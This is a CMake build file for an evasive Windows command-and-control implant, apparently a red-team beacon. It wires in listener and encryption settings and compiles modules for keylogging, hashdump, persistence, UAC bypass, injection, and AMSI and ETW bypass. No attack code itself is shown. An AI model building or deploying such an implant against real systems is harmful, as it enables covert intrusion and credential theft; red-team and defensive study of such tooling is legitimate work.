cmake_minimum_required(VERSION 3.22)
project(${PAYLOAD_NAME}.${PAYLOAD_ARCH})

# COMPILER
if(${PAYLOAD_ARCH} STREQUAL "amd64")
    set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)
elseif(${PAYLOAD_ARCH} STREQUAL "i686")
    set(CMAKE_CXX_COMPILER i686-w64-mingw32-g++)
endif()

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# FLAGS
set(CMAKE_CXX_FLAGS "-municode -Os -s \
    -fno-asynchronous-unwind-tables -falign-jumps=1 -falign-labels=1 \
    -ffunction-sections -fdata-sections -fno-exceptions -fPIC \
    -static-libgcc \
    -Wl,-subsystem,windows,-s,--no-seh,--enable-stdcall-fixup,--gc-sections,-Bstatic"
)

# INCLUDE
include_directories(include)

# MACROS
if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
    add_compile_definitions(PAYLOAD_SLEEP=${PAYLOAD_SLEEP})
    add_compile_definitions(PAYLOAD_JITTER=${PAYLOAD_JITTER})
    add_compile_definitions(PAYLOAD_KILLDATE=${PAYLOAD_KILLDATE})
endif()
add_compile_definitions(PAYLOAD_TYPE=${PAYLOAD_TYPE})
if(${PAYLOAD_INDIRECT_SYSCALLS} STREQUAL "true")
    add_compile_definitions(PAYLOAD_INDIRECT_SYSCALLS=${PAYLOAD_INDIRECT_SYSCALLS})
endif()
if(${PAYLOAD_ANTI_DEBUG} STREQUAL "true")
    add_compile_definitions(PAYLOAD_ANTI_DEBUG=${PAYLOAD_ANTI_DEBUG})
endif()
add_compile_definitions(LISTENER_PROTOCOL=${LISTENER_PROTOCOL})
add_compile_definitions(LISTENER_HOST=${LISTENER_HOST})
add_compile_definitions(LISTENER_PORT=${LISTENER_PORT})
add_compile_definitions(REQUEST_PATH_CHECKIN=${REQUEST_PATH_CHECKIN})
add_compile_definitions(REQUEST_PATH_DOWNLOAD=${REQUEST_PATH_DOWNLOAD})
add_compile_definitions(REQUEST_PATH_TASKGET=${REQUEST_PATH_TASKGET})
add_compile_definitions(REQUEST_PATH_TASKRESULT=${REQUEST_PATH_TASKRESULT})
add_compile_definitions(REQUEST_PATH_UPLOAD=${REQUEST_PATH_UPLOAD})
add_compile_definitions(REQUEST_PATH_WEBSOCKET=${REQUEST_PATH_WEBSOCKET})
add_compile_definitions(REQUEST_PATH_SOCKET_OPEN=${REQUEST_PATH_SOCKET_OPEN})
add_compile_definitions(REQUEST_PATH_SOCKET_CLOSE=${REQUEST_PATH_SOCKET_CLOSE})
add_compile_definitions(AES_KEY_BASE64=${AES_KEY_BASE64})
add_compile_definitions(AES_IV_BASE64=${AES_IV_BASE64})
if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
    add_compile_definitions(IS_DLL=1)
endif()
if(${PAYLOAD_FORMAT} STREQUAL "bin")
    add_compile_definitions(IS_SHELLCODE=1)
endif()

# SOURCES
set(SOURCE_ASM
        ${ASM_OBJ_SYSCALLS}
        ${ASM_OBJ_REFLECTIVE}
)

set(SOURCE_CORE
        src/core/crypt.cpp
        src/core/handler.cpp
        src/core/modules.cpp
        src/core/parser.cpp
        src/core/procs.cpp
        # src/core/socket.cpp
        src/core/state.cpp
        src/core/stdout.cpp
        src/core/syscalls.cpp
        src/core/system/arch.cpp
        src/core/system/env.cpp
        src/core/system/fs.cpp
        src/core/system/group.cpp
        src/core/system/handle.cpp
        src/core/system/http.cpp
        src/core/system/priv.cpp
        src/core/system/process.cpp
        src/core/system/registry.cpp
        src/core/system/user.cpp
        src/core/task/assembly.cpp
        src/core/task/cat.cpp
        src/core/task/cd.cpp
        src/core/task/cmd.cpp
        src/core/task/connect.cpp
        src/core/task/cp.cpp
        src/core/task/dll.cpp
        src/core/task/download.cpp
        src/core/task/env.cpp
        src/core/task/find.cpp
        src/core/task/group.cpp
        src/core/task/hashdump.cpp
        src/core/task/history.cpp
        src/core/task/ip.cpp
        src/core/task/jitter.cpp
        src/core/task/keylog.cpp
        src/core/task/kill.cpp
        src/core/task/killdate.cpp
        src/core/task/ls.cpp
        src/core/task/migrate.cpp
        src/core/task/mkdir.cpp
        src/core/task/mv.cpp
        src/core/task/net.cpp
        src/core/task/pe.cpp
        src/core/task/persist.cpp
        src/core/task/procdump.cpp
        src/core/task/ps.cpp
        src/core/task/pwd.cpp
        src/core/task/reg.cpp
        src/core/task/rm.cpp
        src/core/task/rmdir.cpp
        src/core/task/rportfwd.cpp
        src/core/task/runas.cpp
        src/core/task/screenshot.cpp
        src/core/task/shellcode.cpp
        src/core/task/sleep.cpp
        src/core/task/token.cpp
        src/core/task/uac.cpp
        src/core/task/upload.cpp
        src/core/task/user.cpp
        src/core/task/whoami.cpp
        src/core/technique/amsi_bypass.cpp
        src/core/technique/anti_debug.cpp
        src/core/technique/etw_bypass.cpp
        src/core/technique/injection/dll_injection.cpp
        src/core/technique/injection/pe_injection.cpp
        src/core/technique/injection/shellcode_injection.cpp
        src/core/utils/convert.cpp
        src/core/utils/random.cpp
        src/core/utils/split.cpp
        src/core/utils/strings.cpp
)

if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
    if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
        set(SOURCE_MAIN
                src/hermit.cpp
                src/main/beacon_dll.cpp
                src/main/rfl.cpp
        )
    elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
        set(SOURCE_MAIN
                src/hermit.cpp
                src/main/beacon_exe.cpp
        )
    endif()
# elseif(${PAYLOAD_TYPE} STREQUAL \"interactive\")
endif()

# LINK LIBRATILIES
link_libraries(dbghelp gdi32 gdiplus iphlpapi netapi32 psapi wsock32 ws2_32)

# ADD
if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
    add_library(${PROJECT_NAME} SHARED ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            LIBRARY_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".dll"
    )
elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
    add_executable(${PROJECT_NAME} ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".exe"
    )
endif()
